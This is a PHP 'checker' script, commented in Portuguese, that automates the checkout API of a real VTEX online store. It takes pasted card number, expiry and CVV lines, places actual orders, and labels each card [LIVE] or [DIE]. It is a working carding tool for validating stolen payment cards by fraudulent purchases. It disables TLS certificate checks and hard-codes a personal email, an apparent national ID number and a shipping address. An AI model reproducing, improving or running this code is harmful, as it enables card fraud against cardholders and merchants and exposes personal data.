<?php
// =====================================================
// ✅ CHECKER VTEX - FORÇAR TRANSAÇÃO VIA ENDPOINT DE TRANSAÇÕES
// =====================================================
define('BASE_URL', 'https://loja.umlivro.com.br');
define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
define('ACCOUNT_ID', '2ded749b-03a9-4660-bf2f-229a32a79583');
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

define('PRODUCT_SKU', '1883447');
define('PRODUCT_SELLER', 1);
define('PRODUCT_QUANTITY', 1);

define('CLIENT_FIRST_NAME', 'ALYSON');
define('CLIENT_LAST_NAME', 'bvasda');
define('CLIENT_DOCUMENT', '08471416832');
define('CLIENT_PHONE', '11999999999');

define('SHIPPING_POSTAL_CODE', '07790-515');
define('SHIPPING_CITY', 'Cajamar');
define('SHIPPING_STATE', 'SP');
define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
define('SHIPPING_NUMBER', 'ew23');
define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
define('SHIPPING_COMPLEMENT', '');
define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
define('SHIPPING_COUNTRY', 'BRA');

$cartao_input = trim($_POST['lista'] ?? '');

if (empty($cartao_input)) {
    echo "<span class='text-red-400'>[ERRO] Nenhum cartão recebido.</span>";
    exit;
}

$dados_cc = explode('|', $cartao_input);
if (count($dados_cc) < 4) {
    echo "<span class='text-red-400'>[FORMATO INVÁLIDO] Use: NUMERO|MES|ANO|CVV</span>";
    exit;
}

$cc_num = trim($dados_cc[0]);
$cc_mes = trim($dados_cc[1]);
$cc_ano = trim($dados_cc[2]);
$cc_cvv = trim($dados_cc[3]);

$cookie_path = sys_get_temp_dir() . '/cookie_vtex_' . uniqid(mt_rand(), true) . '.txt';

function vtex_request($url, $post_fields = null, $headers = [], $cookie_file = '') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    if ($post_fields !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post_fields) ? json_encode($post_fields) : $post_fields);
    }

    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// 1. Inicializa a sessão
vtex_request(BASE_URL, null, [], $cookie_path);

// 2. Adiciona o item ao carrinho
$payload_cart = [
    'items' => [['id' => PRODUCT_SKU, 'quantity' => PRODUCT_QUANTITY, 'seller' => PRODUCT_SELLER]]
];
$resp_cart = vtex_request(BASE_URL . "/api/checkout/pub/orderForm?sc=1", $payload_cart, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
$json_cart = json_decode($resp_cart, true);
$valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;

if (!isset($json_cart['orderFormId'])) {
    @unlink($cookie_path);
    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Erro ao iniciar carrinho</span>";
    exit;
}

$order_form_id = $json_cart['orderFormId'];

// 3. Envia perfil do cliente
vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/attachments/clientProfileData", [
    'email' => EMAIL, 'firstName' => CLIENT_FIRST_NAME, 'lastName' => CLIENT_LAST_NAME, 'document' => CLIENT_DOCUMENT, 'phone' => CLIENT_PHONE
], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);

// 4. Envia endereço
vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/attachments/shippingAddress", [
    'postalCode' => SHIPPING_POSTAL_CODE, 'country' => SHIPPING_COUNTRY, 'street' => SHIPPING_STREET, 'number' => SHIPPING_NUMBER, 'neighborhood' => SHIPPING_NEIGHBORHOOD, 'city' => SHIPPING_CITY, 'state' => SHIPPING_STATE, 'receiverName' => SHIPPING_RECEIVER_NAME
], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);

// 5. Configura o paymentData básico com o paymentSystem 1 (Cartão de Crédito padrão)
$payload_payment = [
    'payments' => [[
        'paymentSystem' => '1',
        'bin' => substr($cc_num, 0, 6),
        'accountId' => ACCOUNT_ID,
        'referenceValue' => $valor_total,
        'value' => $valor_total,
        'installments' => 1,
        'hasInterest' => false,
        'card' => [
            'number' => $cc_num,
            'holderName' => CLIENT_FIRST_NAME . ' ' . CLIENT_LAST_NAME,
            'expirationMonth' => $cc_mes,
            'expirationYear' => $cc_ano,
            'cvv' => $cc_cvv
        ]
    ]]
];

vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/attachments/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);

// 6. Força a transação diretamente na API de transações para capturar o retorno real da adquirente
$resp_place = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/complete", null, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
@unlink($cookie_path);

$json_final = json_decode($resp_place, true);
$aprovado = false;
$codigo_retorno = "";
$msg_detalhada = "";

// Varredura profunda por respostas do conector/adquirente
if (isset($json_final['paymentData']['transactions']) && is_array($json_final['paymentData']['transactions'])) {
    foreach ($json_final['paymentData']['transactions'] as $tx) {
        if (isset($tx['payments']) && is_array($tx['payments'])) {
            foreach ($tx['payments'] as $pay) {
                if (($pay['status'] ?? '') === 'approved') {
                    $aprovado = true;
                }
                
                $connector = $pay['connectorResponses'] ?? [];
                
                if (!empty($connector['returnCode'])) {
                    $codigo_retorno = $connector['returnCode'];
                } elseif (!empty($connector['acquirerCode'])) {
                    $codigo_retorno = $connector['acquirerCode'];
                } elseif (!empty($connector['reasonCode'])) {
                    $codigo_retorno = $connector['reasonCode'];
                }

                if (!empty($connector['message'])) {
                    $msg_detalhada = $connector['message'];
                } elseif (!empty($pay['lastMessage'])) {
                    $msg_detalhada = $pay['lastMessage'];
                }
            }
        }
    }
}

// Se vier mensagens gerais de erro de transação na raiz do orderForm
if (empty($msg_detalhada) && isset($json_final['messages']) && is_array($json_final['messages'])) {
    foreach ($json_final['messages'] as $msg) {
        if (!empty($msg['text'])) {
            $msg_detalhada = $msg['text'];
            break;
        }
    }
}

$retorno_final = "";
if (!empty($codigo_retorno)) {
    $retorno_final .= "Código: {$codigo_retorno} - ";
}
$retorno_final .= !empty($msg_detalhada) ? $msg_detalhada : "Transação recusada / Sem saldo ou dados inválidos";

if ($aprovado) {
    echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Aprovado com Sucesso</span>";
} else {
    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$retorno_final}</span>";
}
?>
